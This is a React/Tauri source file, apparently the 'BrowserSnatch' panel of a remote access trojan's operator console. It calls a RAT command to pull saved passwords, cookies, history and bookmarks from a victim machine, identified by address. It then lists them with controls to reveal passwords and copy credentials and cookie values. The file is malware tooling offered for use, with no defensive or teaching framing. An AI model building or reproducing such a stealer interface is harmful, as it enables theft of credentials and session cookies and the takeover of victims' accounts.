import React, { useEffect, useState, useMemo } from "react";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import { getBrowserDataCmd } from "../rat/RATCommands";
import {
  IconBrowser,
  IconLock,
  IconCookie,
  IconHistory,
  IconBookmark,
  IconRefresh,
  IconSearch,
  IconDownload,
  IconExternalLink,
  IconEye,
  IconEyeOff,
  IconCopy,
} from "@tabler/icons-react";
import { BrowserDataPayload, BrowserResult, PasswordEntry, CookieEntry, HistoryEntry, BookmarkEntry } from "../../types";
import toast from "react-hot-toast";

type DataType = "passwords" | "cookies" | "history" | "bookmarks";

export const BrowserData: React.FC = () => {
  const { addr } = useParams();
  const [loading, setLoading] = useState(false);
  const [browsers, setBrowsers] = useState<BrowserResult[]>([]);
  const [selectedBrowser, setSelectedBrowser] = useState<string>("");
  const [activeTab, setActiveTab] = useState<DataType>("passwords");
  const [search, setSearch] = useState("");
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});

  useEffect(() => {
    const unlisten = listen("browser_data", (event) => {
      const payload = event.payload as BrowserDataPayload;
      if (payload.addr === addr) {
        setBrowsers(payload.data.browsers);
        if (payload.data.browsers.length > 0 && !selectedBrowser) {
          setSelectedBrowser(payload.data.browsers[0].name);
        }
        setLoading(false);
        toast.success("Browser data recovered!");
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, [addr, selectedBrowser]);

  const handleRefresh = async () => {
    setLoading(true);
    try {
      await getBrowserDataCmd(addr);
    } catch (e) {
      console.error(e);
      setLoading(false);
      toast.error("Failed to request browser data");
    }
  };

  const currentBrowser = useMemo(() => 
    browsers.find(b => b.name === selectedBrowser), 
  [browsers, selectedBrowser]);

  const filteredData = useMemo(() => {
    if (!currentBrowser) return [];
    const data = currentBrowser[activeTab] as any[];
    if (!search) return data;
    
    const s = search.toLowerCase();
    return data.filter(item => {
      if (activeTab === "passwords") {
        return item.url.toLowerCase().includes(s) || item.username.toLowerCase().includes(s);
      } else if (activeTab === "cookies") {
        return item.domain.toLowerCase().includes(s) || item.name.toLowerCase().includes(s);
      } else if (activeTab === "history" || activeTab === "bookmarks") {
        return item.url.toLowerCase().includes(s) || item.title.toLowerCase().includes(s);
      }
      return false;
    });
  }, [currentBrowser, activeTab, search]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard", { duration: 1000 });
  };

  const togglePassword = (index: number) => {
    setShowPasswords(prev => ({ ...prev, [index]: !prev[index] }));
  };

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      {/* Header */}
      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconBrowser className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Browser<span className="text-accentx">Snatch</span>
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Data Extraction Module // {addr}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="relative">
            <IconSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" size={16} />
            <input
              type="text"
              placeholder="Search..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="bg-[#111] border border-[#1a1a1a] rounded-xl pl-10 pr-4 py-2 text-xs focus:border-accentx/50 outline-none transition-all w-64"
            />
          </div>
          
          <button
            onClick={handleRefresh}
            disabled={loading}
            className={`flex items-center gap-2 px-4 py-2 bg-accentx hover:bg-accentx/80 disabled:bg-gray-800 text-white rounded-xl text-xs font-bold transition-all shadow-lg active:scale-95 ${loading ? "animate-pulse" : ""}`}
          >
            <IconRefresh size={16} className={loading ? "animate-spin" : ""} />
            {loading ? "EXTRACTING..." : "REFRESH DATA"}
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar: Browsers */}
        <div className="w-64 shrink-0 bg-[#080808] border-r border-[#1a1a1a] flex flex-col p-4 gap-2">
          <h2 className="text-[10px] font-bold text-gray-600 uppercase tracking-[0.2em] mb-2 px-2">Detected Browsers</h2>
          {browsers.length === 0 ? (
            <div className="flex-1 flex flex-col items-center justify-center text-center px-4 opacity-30">
              <IconBrowser size={48} stroke={1} />
              <p className="text-[10px] mt-2">No data yet.<br/>Click Refresh to scan.</p>
            </div>
          ) : (
            browsers.map((b) => (
              <button
                key={b.name}
                onClick={() => setSelectedBrowser(b.name)}
                className={`flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition-all border ${
                  selectedBrowser === b.name
                    ? "bg-accentx/10 border-accentx/30 text-accentx shadow-[inset_0_0_20px_rgba(var(--accent-rgb),0.05)]"
                    : "bg-transparent border-transparent text-gray-500 hover:bg-[#111] hover:text-gray-300"
                }`}
              >
                <IconBrowser size={18} />
                {b.name.toUpperCase()}
                {selectedBrowser === b.name && <div className="ml-auto w-1.5 h-1.5 rounded-full bg-accentx shadow-[0_0_10px_rgba(var(--accent-rgb),1)]" />}
              </button>
            ))
          )}
        </div>

        {/* Main Content Area */}
        <div className="flex-1 flex flex-col overflow-hidden bg-[#050505]">
          {/* Top Tabs */}
          <div className="h-14 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center px-4 gap-1">
            {[
              { id: "passwords", label: "Passwords", icon: IconLock },
              { id: "cookies", label: "Cookies", icon: IconCookie },
              { id: "history", label: "History", icon: IconHistory },
              { id: "bookmarks", label: "Bookmarks", icon: IconBookmark },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as DataType)}
                className={`flex items-center gap-2 px-6 h-10 rounded-xl text-xs font-black tracking-tight transition-all duration-300 ${
                  activeTab === tab.id
                    ? "bg-[#151515] text-accentx shadow-inner border border-[#222]"
                    : "text-gray-600 hover:text-gray-400"
                }`}
              >
                <tab.icon size={16} />
                {tab.label.toUpperCase()}
              </button>
            ))}
          </div>

          {/* Data List */}
          <div className="flex-1 overflow-y-auto p-6 custom-scrollbar bg-radial-dots">
            {!currentBrowser ? (
              <div className="h-full flex flex-col items-center justify-center opacity-20">
                <IconDownload size={128} stroke={0.5} />
                <p className="mt-4 font-mono uppercase tracking-[0.3em]">Awaiting Extraction</p>
              </div>
            ) : filteredData.length === 0 ? (
              <div className="h-full flex flex-col items-center justify-center opacity-20">
                <IconSearch size={64} stroke={0.5} />
                <p className="mt-4 font-mono uppercase tracking-[0.3em]">No matches found</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-3">
                {activeTab === "passwords" && (filteredData as PasswordEntry[]).map((entry, i) => (
                  <div key={i} className="group bg-[#0d0d0d] border border-[#1a1a1a] hover:border-accentx/30 p-4 rounded-2xl flex items-center justify-between transition-all hover:shadow-[0_0_30px_rgba(0,0,0,0.5)]">
                    <div className="flex flex-col gap-1 min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <IconLock size={14} className="text-accentx" />
                        <span className="text-sm font-black text-white truncate uppercase italic">{entry.url}</span>
                      </div>
                      <div className="flex items-center gap-4 text-xs font-mono text-gray-500">
                        <span className="flex items-center gap-1.5">User: <span className="text-gray-300">{entry.username || "n/a"}</span></span>
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-4 shrink-0">
                      <div className="flex flex-col items-end gap-1">
                        <span className="text-[10px] text-gray-600 uppercase font-bold tracking-tighter">Password</span>
                        <div className="flex items-center gap-2">
                          <span className={`font-mono text-sm ${showPasswords[i] ? "text-accentx font-bold" : "text-gray-600 tracking-widest"}`}>
                            {showPasswords[i] ? entry.password : "••••••••••••"}
                          </span>
                          <button onClick={() => togglePassword(i)} className="p-1 hover:text-white text-gray-600 transition-colors">
                            {showPasswords[i] ? <IconEyeOff size={16} /> : <IconEye size={16} />}
                          </button>
                        </div>
                      </div>
                      <div className="h-8 w-[1px] bg-[#1a1a1a]" />
                      <button 
                        onClick={() => copyToClipboard(`${entry.url} | ${entry.username} | ${entry.password}`)}
                        className="p-2 bg-[#1a1a1a] hover:bg-accentx hover:text-white rounded-xl transition-all"
                      >
                        <IconCopy size={18} />
                      </button>
                    </div>
                  </div>
                ))}

                {activeTab === "cookies" && (filteredData as CookieEntry[]).map((entry, i) => (
                  <div key={i} className="group bg-[#0d0d0d] border border-[#1a1a1a] hover:border-[#2a2a2a] p-4 rounded-2xl flex items-center justify-between transition-all">
                    <div className="flex flex-col gap-1 min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <IconCookie size={14} className="text-amber-500" />
                        <span className="text-sm font-bold text-gray-200 truncate">{entry.domain}</span>
                        <span className="text-[10px] bg-accentx/10 text-accentx px-1.5 rounded uppercase font-bold">{entry.name}</span>
                      </div>
                      <div className="text-xs font-mono text-gray-500 truncate max-w-[500px]">
                        Value: <span className="text-gray-400">{entry.value}</span>
                      </div>
                    </div>
                    <div className="flex items-center gap-3 shrink-0">
                       <span className="text-[10px] font-mono text-gray-600 italic">Expires: {entry.expires}</span>
                       <button 
                        onClick={() => copyToClipboard(entry.value)}
                        className="p-2 bg-[#1a1a1a] hover:bg-[#222] rounded-xl transition-all"
                      >
                        <IconCopy size={18} />
                      </button>
                    </div>
                  </div>
                ))}

                {(activeTab === "history" || activeTab === "bookmarks") && (filteredData as (HistoryEntry | BookmarkEntry)[]).map((entry, i) => (
                  <div key={i} className="group bg-[#0d0d0d] border border-[#1a1a1a] hover:border-[#2a2a2a] p-4 rounded-2xl flex items-center justify-between transition-all">
                    <div className="flex flex-col gap-1 min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        {activeTab === "history" ? <IconHistory size={14} className="text-blue-500" /> : <IconBookmark size={14} className="text-green-500" />}
                        <span className="text-sm font-bold text-gray-200 truncate">{entry.title || "No Title"}</span>
                      </div>
                      <div className="text-[11px] font-mono text-gray-500 truncate">
                        {entry.url}
                      </div>
                    </div>
                    <div className="flex items-center gap-4 shrink-0">
                       {activeTab === "history" && (
                         <div className="text-right">
                           <div className="text-[10px] text-gray-600 font-bold uppercase">Visits</div>
                           <div className="text-xs text-accentx font-black">{(entry as HistoryEntry).visit_count}</div>
                         </div>
                       )}
                       <a 
                        href={entry.url} 
                        target="_blank" 
                        rel="noreferrer"
                        className="p-2 bg-[#1a1a1a] hover:bg-accentx hover:text-white rounded-xl transition-all"
                      >
                        <IconExternalLink size={18} />
                      </a>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar {
          width: 8px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
          background: transparent;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
          background: #1a1a1a;
          border-radius: 4px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
          background: #222;
        }
        .bg-radial-dots {
          background-image: radial-gradient(#1a1a1a 1px, transparent 1px);
          background-size: 32px 32px;
        }
      `}} />
    </div>
  );
};
